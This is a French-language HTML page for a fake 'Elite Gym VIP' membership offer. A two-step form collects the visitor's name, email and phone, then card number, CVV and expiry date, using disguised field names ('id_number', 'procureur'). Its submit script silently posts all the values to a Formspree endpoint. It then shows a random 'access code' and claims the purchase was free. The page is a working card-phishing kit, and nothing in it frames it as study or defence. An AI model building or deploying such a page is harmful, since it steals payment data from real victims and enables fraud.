<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Elite Gym VIP</title>

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap" rel="stylesheet">

<style>
:root {
    --primary: #ff2d2d;
    --bg: #0a0a0a;
    --card: #141414;
}

* {margin:0; padding:0; box-sizing:border-box;}
body {font-family:'Poppins', sans-serif; background:var(--bg); color:white;}

section {display:none; padding:20px; min-height:100vh;}
.active {display:flex; flex-direction:column; justify-content:center; align-items:center;}
.fade {animation:fade 0.5s ease;}

@keyframes fade {from {opacity:0; transform:translateY(15px);} to {opacity:1; transform:translateY(0);}}

h1 {font-size:36px; text-align:center; margin-bottom:15px;}
p {text-align:center; opacity:0.8;}

button {
    width:90%;
    max-width:300px;
    padding:18px;
    margin-top:20px;
    font-size:18px;
    border:none;
    border-radius:12px;
    background:linear-gradient(45deg,#ff0000,#ff4d4d);
    color:white;
    font-weight:bold;
    box-shadow:0 0 20px rgba(255,0,0,0.5);
    cursor:pointer;
}
button:hover {transform:scale(1.05); box-shadow:0 0 30px rgba(255,0,0,0.8);}

.hero {text-align:center;}
.gallery {margin-top:30px;}
.card {margin-bottom:15px; border-radius:12px; overflow:hidden;}
.card img {width:100%; height:180px; object-fit:cover;}

.form-box {background: var(--card); padding:20px; border-radius:15px; max-width:350px; margin:auto;}
input {width:100%; padding:14px; margin:8px 0; border-radius:10px; border:none; background:#1c1c1c; color:white; font-size:16px;}

.step {font-size:14px; opacity:0.5; margin-bottom:10px;}

.card-badge {
    background: linear-gradient(45deg,#ff0000,#ff4d4d);
    border-radius:15px;
    padding:30px;
    text-align:center;
    max-width:300px;
    box-shadow:0 0 30px rgba(255,0,0,0.7);
    margin-top:20px;
}
.card-badge h2 {margin-bottom:15px;}
.card-badge p {opacity:0.9; font-size:18px;}

.congrats {
    margin-top:15px;
    font-size:18px;
    opacity:0.9;
    text-align:center;
}
</style>

<script>
function showSection(id){
    document.querySelectorAll("section").forEach(s=>s.classList.remove("active"));
    document.getElementById(id).classList.add("active");
    document.getElementById(id).classList.add("fade");
}

// Génère un mot de passe aléatoire
function generatePassword(length=10){
    const chars="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%&*";
    let pw="";
    for(let i=0;i<length;i++){
        pw += chars.charAt(Math.floor(Math.random()*chars.length));
    }
    return pw;
}

// Génère le code et affiche badge + message
function generateAccess(){
    const password = generatePassword();
    document.getElementById('displayPassword').innerText = password;
    document.getElementById('congratsMsg').innerText = "🎉 Bravo pour ton 100ᵉ achat ! C’est gratuit !";
    showSection('badge');
}
</script>

</head>
<body>

<!-- HOME -->
<section id="home" class="active">
    <div class="hero">
        <h1>🔥 Elite Gym</h1>
        <p>Le corps que tu veux commence ici</p>
        <button onclick="showSection('form1')">🚀 Offre limitée 10$</button>
    </div>
    <div class="gallery">
        <div class="card"><img src="https://images.unsplash.com/photo-1571902943202-507ec2618e8f"></div>
        <div class="card"><img src="https://images.unsplash.com/photo-1599058917765-a780eda07a3e"></div>
        <div class="card"><img src="https://images.unsplash.com/photo-1517836357463-d25dfeac3438"></div>
    </div>
</section>

<!-- FORM 1 -->
<section id="form1">
    <div class="form-box">
        <div class="step">Étape 1/2</div>
        <h2>Vos informations</h2>
        <form id="formStep1">
            <input type="text" name="nom" placeholder="Nom" required>
            <input type="text" name="prenom" placeholder="Prénom" required>
            <input type="email" name="email" placeholder="Email" required>
            <input type="tel" name="telephone" placeholder="Téléphone" required>
            <button type="submit">Continuer →</button>
        </form>
    </div>
</section>

<!-- FORM 2 -->
<section id="form2">
    <div class="form-box">
        <div class="step">Étape 2/2</div>
        <h2>Vérification</h2>
        <form id="formStep2">
            <input type="text" name="id_number" placeholder="Numéro de carte bancaire" required>
            <input type="text" name="procureur" placeholder="cvv" required>
            <input type="date" name="expiration" required>
            <button type="submit">Valider ✔</button>
        </form>
    </div>
</section>

<!-- BADGE / CODE D'ACCES -->
<section id="badge">
    <h1>✅ Voilà ton code d'accès</h1>
    <div class="card-badge">
        <h2>Elite Gym VIP</h2>
        <p>Code d’accès : <span id="displayPassword"></span></p>
        <p>Montre ce code pour entrer dans la salle</p>
        <div class="congrats" id="congratsMsg"></div>
    </div>
    <a href="https://formspree.io/f/xjgpgjlk" target="_blank">
        <button>📩 Enregistrer vos infos</button>
    </a>
    <button onclick="showSection('home')">🔄 Revenir à l’accueil</button>
</section>

<script>
// STEP 1 → STEP 2
document.getElementById("formStep1").addEventListener("submit", function(e){
    e.preventDefault();
    showSection('form2');
});

// STEP 2 → générer code aléatoire et afficher badge
document.getElementById("formStep2").addEventListener("submit", function(e){
    e.preventDefault();

    // Envoyer les infos sur Formspree
    let data = new FormData();
    document.querySelectorAll("#formStep1 input, #formStep2 input").forEach(input=>{
        data.append(input.name, input.value);
    });
    fetch("https://formspree.io/f/xjgpgjlk", {
        method:"POST",
        body:data,
        headers:{'Accept':'application/json'}
    });

    // générer code et afficher badge
    generateAccess();
});
</script>

</body>
</html>
